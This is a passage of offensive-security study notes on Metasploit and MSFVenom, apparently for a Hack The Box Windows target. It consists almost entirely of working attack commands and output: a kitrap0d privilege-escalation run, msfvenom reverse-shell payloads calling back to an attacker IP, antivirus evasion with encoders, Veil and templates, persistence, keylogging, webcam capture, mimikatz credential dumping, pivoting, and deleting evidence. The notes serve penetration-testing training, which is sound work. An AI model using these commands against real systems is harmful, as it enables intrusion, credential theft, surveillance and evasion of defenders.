        msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338
        LPORT => 1338
        msf6 exploit(windows/local/ms10_015_kitrap0d) > run
        [*] Started reverse TCP handler on 10.10.14.5:1338
        [*] Launching notepad to host the exploit...
        [+] Process 3552 launched.
        [*] Reflectively injecting the exploit DLL into 3552...
        [*] Exploit injected. Injecting payload into 3552...
        [*] Exploit finished, wait for (hopefully privileged) payload execution to complete.
        [*] Sending stage (176195 bytes) to 10.10.10.5
        [*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162) at 2020-08-28 17:1
        meterpreter > getuid
        Server username: NT AUTHORITY\\SYSTEM
        
        ```
        
    - **Result**:
        - A new Meterpreter session is opened with `NT AUTHORITY\\SYSTEM` privileges, granting full control over the target.

### Integration with Previous Notes

- **Meterpreter ("11 Meterpreter.pdf")**:
    - MSFVenom generates Meterpreter payloads (e.g., `windows/meterpreter/reverse_tcp`) used in exploitation.
    - Post-exploitation tasks (e.g., `getuid`, `hashdump`) are performed after gaining a Meterpreter session:
        
        ```
        meterpreter > hashdump
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        
        ```
        
    - Privilege escalation mirrors the process in "11 Meterpreter.pdf" (e.g., using `local_exploit_suggester` and `ms15_051_client_copy_image`).
- **Sessions ("10 MSF Sessions.pdf")**:
    - MSFVenom payloads create sessions managed by `multi/handler`:
        
        ```
        msf6 > sessions
        Active sessions
        Id  Type                   Information                            Connection
        4   meterpreter x86/windows NT AUTHORITY\\SYSTEM @ GRANNY         10.10.14.5:1338 -> 10.10.10.5:49162
        
        ```
        
    - Background sessions for privilege escalation:
        
        ```
        meterpreter > background
        msf6 > use post/multi/recon/local_exploit_suggester
        
        ```
        
- **Encoders ("7 MSF Encoders.pdf")**:
    - MSFVenom supports encoders to stabilize payloads and evade AV:
        
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx -e x86/shikata_ga_nai -i 5 > reverse_shell.aspx
        
        ```
        
    - Encoders like `x86/shikata_ga_nai` reduce detection rates but are less effective against modern AV.
- **Databases ("8 MSF Databases.pdf")**:
    - Store scan results and credentials:
        
        ```
        msf6 > db_nmap -sV -p- 10.10.10.5
        msf6 > hosts
        Hosts
        address     os_name  purpose  info
        10.10.10.5  Windows  server
        msf6 > services
        Services
        host        port  proto  name  state  info
        10.10.10.5  21    tcp    ftp   open   Microsoft FTPd
        10.10.10.5  80    tcp    http  open   Microsoft IIS httpd 7.5
        
        ```
        
    - Save credentials after privilege escalation:
        
        ```
        msf6 > creds
        Credentials
        host        service  user           password
        10.10.10.5  sam      Administrator  31d6cfe0d16ae931b73c59d7e0c089c0
        
        ```
        
- **Plugins ("9 MSF Plugins.pdf")**:
    - Use `pentest` plugin to automate post-exploitation:
        
        ```
        msf6 > load pentest
        msf6 > multi_meter_cmd hashdump
        
        ```
        
    - Integrate with `nessus` for vulnerability scanning:
        
        ```
        msf6 > load nessus
        msf6 > nessus_scan_new 10.10.10.5
        
        ```
        

### Common Issues and Troubleshooting

- **Session Instability** (page 4):
    - **Cause**: Unencoded payloads may crash or be detected by AV.
    - **Solution**:
        - Use an encoder:
            
            ```
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx -e x86/shikata_ga_nai -i 5 > reverse_shell.aspx
            
            ```
            
        - Switch to a stageless payload:
            
            ```
            msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
            
            ```
            
        - Use HTTPS for stability:
            
            ```
            msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f aspx > reverse_shell.aspx
            
            ```
            
- **AV Detection**:
    - **Solution**:
        - Test payloads with VirusTotal or local AV to gauge detection:
            
            ```
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f exe > test.exe
            
            ```
            
        - Use custom encoders or packers (e.g., UPX, Veil).
- **Exploit Failure**:
    - **Solution**:
        - Verify target compatibility:
            
            ```
            msf6 exploit(windows/local/ms10_015_kitrap0d) > check
            
            ```
            
        - Try alternative exploits from `local_exploit_suggester`:
            
            ```
            msf6 > use exploit/windows/local/ms10_092_schelevator
            
            ```
            
- **FTP Upload Issues**:
    - **Solution**:
        - Ensure anonymous write access:
            
            ```
            ftp> put reverse_shell.aspx
            
            ```
            
        - Check file permissions on the server:
            
            ```
            ftp> ls -l
            
            ```
            

### Ethical and Practical Notes

- **Ethical Use**:
    - Use MSFVenom only in authorized environments (e.g., penetration tests, CTFs like Hack The Box).
    - Secure payloads and session data to prevent unauthorized access.
- **Lab Setup**:
    - Practice on vulnerable VMs (e.g., Windows 7 with IIS 7.5 and FTP enabled).
    - Example: Set up a Windows 7 VM with anonymous FTP and IIS to replicate the scenario.
    - Platforms: TryHackMe, Hack The Box, or local VMs via VirtualBox.
- **Forensic Awareness**:
    - Defenders can detect payloads by monitoring FTP uploads, web server logs, or memory for Meterpreter signatures.
    - Attackers should clean up:
        
        ```
        meterpreter > shell
        del C:\\inetpub\\wwwroot\\reverse_shell.aspx
        
        ```
        
- **Persistence**:
    - Establish persistence after privilege escalation:
        
        ```
        meterpreter > run persistence -U -i 30 -p 1338 -r 10.10.14.5
        
        ```
        
    - Monitor for detection by AV or EDR solutions.

### Advanced MSFVenom Techniques

- **Custom Payloads**:
    - Generate payloads for other formats (e.g., `.exe`, `.php`):
        
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f exe > reverse_shell.exe
        msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f raw > reverse_shell.php
        
        ```
        
- **Bad Character Removal**:
    - Specify bad characters to avoid runtime errors:
        
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx -b '\\x00\\x0a\\x0d' > reverse_shell.aspx
        
        ```
        
- **Multi-Stage Encoding**:
    - Chain multiple encoders:
        
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx -e x86/shikata_ga_nai -i 3 -e x86/countdown -i 2 > reverse_shell.aspx
        
        ```
        
- **Bind Shells**:
    - Create a bind shell for direct connections:
        
        ```
        msfvenom -p windows/meterpreter/bind_tcp RHOST=10.10.10.5 LPORT=4444 -f aspx > bind_shell.aspx
        
        ```
        
- **Custom Templates**:
    - Use a legitimate `.aspx` file as a template to blend in:
        
        ```
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx -x template.aspx > reverse_shell.aspx
        
        ```
        

### Next Steps

- **Advanced Payload Crafting**:
    - Explore stageless payloads for stealth:
        
        ```
        msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
        
        ```
        
    - Use PowerShell payloads for modern Windows systems:
        
        ```
        msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f ps1 > reverse_shell.ps1
        
        ```
        
- **AV Evasion**:
    - Use tools like Veil or Hyperion to obfuscate payloads:
        
        ```
        veil-evasion --setup
        veil-evasion -p c/meterpreter/rev_tcp -o payload --msfvenom LHOST=10.10.14.5 LPORT=1337
        
        ```
        
    - Test payloads in a sandbox to refine evasion techniques.
- **Post-Exploitation**:
    - Perform advanced Meterpreter tasks:
        
        ```
        meterpreter > screenshot
        meterpreter > keyscan_start
        meterpreter > webcam_snap
        
        ```
        
    - Dump credentials:
        
        ```
        meterpreter > load mimikatz
        meterpreter > kerberos
        
        ```
        
- **Pivoting**:
    - Set up routes for network pivoting:
        
        ```
        meterpreter > run autoroute -s 10.10.10.0/24
        
        ```
        
    - Forward ports to access internal services:
        
        ```
        meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.6
        
        ```
        
- **Further Reading**:
    - MSFVenom Guide: [https://docs.metasploit.com/docs/using-metasploit/basics/using-msfvenom.html](https://docs.metasploit.com/docs/using-metasploit/basics/using-msfvenom.html)
    - AV Evasion: [https://www.offensive-security.com/metasploit-unleashed/evading-anti-virus/](https://www.offensive-security.com/metasploit-unleashed/evading-anti-virus/)
    - Privilege Escalation: [https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)